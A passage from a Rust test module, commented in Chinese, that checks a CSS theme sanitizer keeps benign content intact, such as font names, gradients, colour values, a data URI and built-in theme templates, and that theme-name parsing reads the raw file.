        assert!(out.contains(r#""JetBrains Mono""#), "字型名被誤清: {out}");
        assert!(out.contains("radial-gradient"), "漸層被破壞: {out}");
        assert!(out.contains("rgba(78, 204, 163, 0.35)"), "色值被破壞: {out}");
    }

    #[test]
    fn preserves_data_uri() {
        let css = r#"body { background: url("data:image/svg+xml;base64,PHN2Zy8+"); }"#;
        let out = sanitize_theme_css(css);
        assert!(out.contains("PHN2Zy8+"), "data: URI 應保留: {out}");
    }

    // 內建模板是使用者「複製為範本」的起點，淨化後不得變質。
    #[test]
    fn builtin_templates_survive_sanitizer() {
        for (name, template) in [
            ("emerald", TEMPLATE_EMERALD_FOREST),
            ("nordic", TEMPLATE_NORDIC_FROST),
            ("office97", TEMPLATE_OFFICE_97),
        ] {
            let out = sanitize_theme_css(template);
            // 註解移除與 escape 解碼會改變空白/字面，故比對關鍵宣告而非全等
            assert!(out.contains("--bg:"), "{name} 的 --bg 遺失: {out}");
            assert!(
                out.matches('{').count() == template.matches('{').count(),
                "{name} 的 rule 數量改變"
            );
        }
    }

    #[test]
    fn theme_name_survives_comment_stripping() {
        // parse_theme_name 讀原始檔（非淨化後），此測試確認兩者職責未混淆
        let raw = "/* Theme Name: 翠綠森林 */\nhtml { --bg: #000; }";
        assert_eq!(parse_theme_name(raw, "fallback"), "翠綠森林");
    }
}
